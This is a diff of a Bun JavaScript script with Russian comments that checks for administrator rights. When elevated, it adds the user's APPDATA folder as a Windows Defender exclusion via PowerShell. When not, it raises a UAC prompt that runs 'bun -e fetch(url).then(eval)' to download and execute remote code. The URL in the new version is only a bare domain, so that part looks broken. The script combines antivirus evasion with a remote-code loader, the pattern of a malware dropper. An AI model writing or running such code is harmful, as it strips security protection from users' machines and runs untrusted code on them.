@@ -1,4 +1,4 @@
-// admin-loop.js
+// excl.js
 (async () => {
   const { dlopen, FFIType, ptr } = await import("bun:ffi");
 
@@ -18,14 +18,16 @@
     } catch (e) { return false; }
   };
 
-        if (admin) {
-    console.log("✅ АДМИН! PID:", process.pid);
-    const appData = process.env.APPDATA || "C:\\Users\\User\\AppData\\Roaming";
-    console.log(`🛡️ Цель: ${appData}`);
+  const is_admin = await isAdmin(); // Объявляем переменную
+  console.log(`🚀 PID: ${process.pid} | Admin: ${is_admin}`);
 
-    // Пытаемся добавить исключение через PowerShell и ЧИТАЕМ вывод
+  if (is_admin) {
+    const appData = process.env.APPDATA || "C:\\Users\\User\\AppData\\Roaming";
+    console.log(`🛡️ Попытка добавить исключение: ${appData}`);
+
+    // Запускаем PowerShell и ЧИТАЕМ ошибки
     const ps = Bun.spawn({
-      cmd: ["powershell", "-Command", `Add-MpPreference -ExclusionPath '${appData}' -ErrorAction Stop; "Done"`],
+      cmd: ["powershell", "-Command", `Add-MpPreference -ExclusionPath '${appData}' -ErrorAction Stop`],
       stdout: "pipe",
       stderr: "pipe"
     });
@@ -34,32 +36,20 @@
     const err = await new Response(ps.stderr).text();
 
     if (err) {
-      console.log("❌ Ошибка Defender:", err.trim());
-      console.log("💡 Скорее всего, включен Tamper Protection (Защита от подделки).");
+      console.log("❌ ОШИБКА DEFENDER:");
+      console.log(err.trim()); 
+      console.log("\n💡 Если видишь 'Access Denied', значит включен Tamper Protection.");
     } else {
-      console.log("✅ Результат:", out.trim());
+      console.log("✅ УСПЕХ: Исключение должно быть добавлено.");
     }
-
-    // Проверка реестра
-    const reg = Bun.spawn({
-      cmd: ["reg", "query", "HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows Defender\\Exclusions\\Paths"],
-      stdout: "pipe",
-      stderr: "pipe"
-    });
-    console.log("\n--- Текущие исключения в реестре ---");
-    console.log(await new Response(reg.stdout).text() || "Пусто или доступ запрещен");
 
     console.log("\nНажми Enter для выхода...");
     for await (const line of console) break;
     return;
   }
 
-
-
   console.log("❌ Не админ. Запрос UAC...");
-  const url = "https://raw.githubusercontent.com/gaknulzhizhkoi-cloud/OnATRTA/refs/heads/main/scripts/admin-loop.js";
-  
-  // РЕШЕНИЕ: Передаем в UAC команду, которая заставит НОВЫЙ bun сам скачать код
+  const url = "https://githubusercontent.com";
   const payload = `bun -e "fetch('${url}').then(r=>r.text()).then(eval)"`;
 
   shell32.symbols.ShellExecuteW(0, toPtr("runas"), toPtr("cmd.exe"), toPtr("/k " + payload), 0, 1);
